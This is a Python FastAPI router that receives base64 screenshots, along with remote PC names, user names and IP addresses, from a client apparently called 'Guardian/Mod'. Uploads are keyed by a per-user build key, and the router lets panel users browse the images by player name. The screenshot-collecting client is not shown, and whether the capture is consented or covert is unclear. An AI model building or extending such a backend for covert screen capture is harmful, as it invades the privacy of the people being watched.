from typing import Any
from fastapi import APIRouter, Depends, HTTPException, Request
from fastapi.responses import Response
from sqlalchemy.orm import Session
from app.api import deps
from app.core.database import get_db
from app.models.user import User, Log
import json
import base64

router = APIRouter()

@router.post('/upload/{build_key}')
async def upload_screenshot(
    build_key: str,
    request: Request,
    db: Session = Depends(get_db),
) -> Any:
    """Receive screenshot upload from Guardian/Mod"""
    user = db.query(User).filter(User.build_key == build_key).first()
    if not user:
        raise HTTPException(status_code=404, detail="Invalid build key")

    try:
        data = await request.json()
    except:
        raise HTTPException(status_code=400, detail="Invalid JSON")

    pc_name = data.get('pc_name', 'Unknown')
    pc_user = data.get('pc_user', 'Unknown')
    image_b64 = data.get('image', '')
    if not image_b64:
        raise HTTPException(status_code=400, detail='No image data')

    new_log = Log(
        user_id=user.id,
        log_type='screenshot',
        content=json.dumps({'image': image_b64, 'pc_user': pc_user}),
        ip_address=request.client.host,
        pc_name=pc_name,
        pc_user=pc_user
    )
    db.add(new_log)
    db.commit()

    return {"success": True, "log_id": new_log.id}




@router.get("/latest/{player_name}")
def get_latest_screenshot(
    player_name: str,
    current_user: User = Depends(deps.get_current_user),
    db: Session = Depends(get_db),
) -> Any:
    """Get the latest screenshot for a player"""
    # Build query - filter by pc_name or pc_user matching player name
    query = db.query(Log).filter(Log.log_type == 'screenshot')
    
    # User isolation - admins see all
    if not current_user.is_admin:
        query = query.filter(Log.user_id == current_user.id)
    
    # Match player by pc_name or pc_user
    query = query.filter(
        (Log.pc_name.ilike(f'%{player_name}%')) | 
        (Log.pc_user.ilike(f'%{player_name}%'))
    )
    
    # Get latest
    screenshot = query.order_by(Log.created_at.desc()).first()
    
    if not screenshot:
        return {"success": False, "error": "No screenshots found"}
    
    return {
        "success": True,
        "id": screenshot.id,
        "pc_name": screenshot.pc_name,
        "pc_user": screenshot.pc_user,
        "created_at": screenshot.created_at.isoformat() if screenshot.created_at else None
    }


@router.get("/image/{log_id}")
def get_screenshot_image(
    log_id: int,
    current_user: User = Depends(deps.get_current_user),
    db: Session = Depends(get_db),
):
    """Get screenshot image by log ID"""
    log = db.query(Log).filter(Log.id == log_id, Log.log_type == 'screenshot').first()
    
    if not log:
        raise HTTPException(status_code=404, detail="Screenshot not found")
    
    # User isolation
    if not current_user.is_admin and log.user_id != current_user.id:
        raise HTTPException(status_code=403, detail="Access denied")
    
    # Parse content to get base64 image
    try:
        content = json.loads(log.content)
        image_b64 = content.get('image', '')
        
        if not image_b64:
            raise HTTPException(status_code=404, detail="No image data")
        
        # Remove data URL prefix if present
        if ',' in image_b64:
            image_b64 = image_b64.split(',')[1]
        
        image_data = base64.b64decode(image_b64)
        
        return Response(content=image_data, media_type="image/jpeg")
    except Exception as e:
        raise HTTPException(status_code=500, detail=f"Error: {str(e)}")


@router.get("")
def list_screenshots(
    current_user: User = Depends(deps.get_current_user),
    db: Session = Depends(get_db),
    limit: int = 50,
) -> Any:
    """List all screenshots"""
    query = db.query(Log).filter(Log.log_type == 'screenshot')
    
    # User isolation
    if not current_user.is_admin:
        query = query.filter(Log.user_id == current_user.id)
    
    screenshots = query.order_by(Log.created_at.desc()).limit(limit).all()
    
    return {
        "success": True,
        "screenshots": [
            {
                "id": s.id,
                "pc_name": s.pc_name,
                "pc_user": s.pc_user,
                "created_at": s.created_at.isoformat() if s.created_at else None
            }
            for s in screenshots
        ]
    }
